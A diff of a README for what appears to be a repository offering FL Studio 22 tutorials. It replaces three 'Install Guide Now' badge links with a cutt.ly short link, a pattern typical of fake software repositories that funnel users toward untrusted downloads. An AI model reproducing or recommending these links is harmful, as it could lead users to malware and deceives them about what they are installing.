@@ -8,7 +8,7 @@
 
 🎹 Elevate your music production with FL Studio 22 in 2025! This repository offers tutorials, resources, and tips for producers to explore FL Studio’s tools for composing, mixing, and mastering. Join our community of music creators to enhance your tracks!  
 
-<a href="https://beatcrafthub.github.io/.github/" target="_blank">
+<a href="https://cutt.ly/IrNt0r1Q" target="_blank">
   <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
 
@@ -24,9 +24,10 @@
 - ✅ **Community Hub**: Connect with music production enthusiasts.  
 - ✅ **Workflow Tips**: Boost your music creation efficiency.  
 
-<a href="https://beatcrafthub.github.io/.github/" target="_blank">
+<a href="https://cutt.ly/IrNt0r1Q" target="_blank">
   <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
+
 
 ### 💻 System Requirements  
 
@@ -36,9 +37,10 @@
 - **Processor**: Multi-core Intel/AMD (2.5GHz+)  
 - **Audio Interface**: Recommended for low-latency recording  
 
-<a href="https://beatcrafthub.github.io/.github/" target="_blank">
+<a href="https://cutt.ly/IrNt0r1Q" target="_blank">
   <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
+
 
 ### 🌟 What Makes It Great  
 
